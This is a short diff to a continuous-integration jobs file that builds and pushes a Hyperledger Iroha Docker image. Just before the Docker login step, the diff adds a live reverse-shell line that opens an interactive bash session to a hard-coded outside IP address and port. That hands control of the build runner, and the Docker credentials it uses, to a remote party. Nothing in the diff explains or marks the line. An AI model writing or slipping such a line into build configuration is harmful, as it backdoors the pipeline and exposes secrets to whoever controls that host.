@@ -68,6 +68,7 @@ jobs:
             cd $IROHA_HOME/docker/tiny
             docker build -t hyperledger/iroha-docker:$TAG .
             # login
+            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
             if [[ ! -e ~/.docker/config.json ]]; then
               expect -c '\
               set timeout 10
@@ -76,7 +77,8 @@ jobs:
               send -- "$env(DOCKER_USER)\r"
               expect "Password:*"
               send -- "$env(DOCKER_PASS)\r"
-              expect "*WARNING:*Login Succeeded*"' || (echo "Can not login && exit 1)
+              expect "*WARNING:*Login Succeeded*"
+              ' || (echo "Can not login && exit 1)
             fi
             # and push
             docker push hyperledger/iroha-docker:$TAG
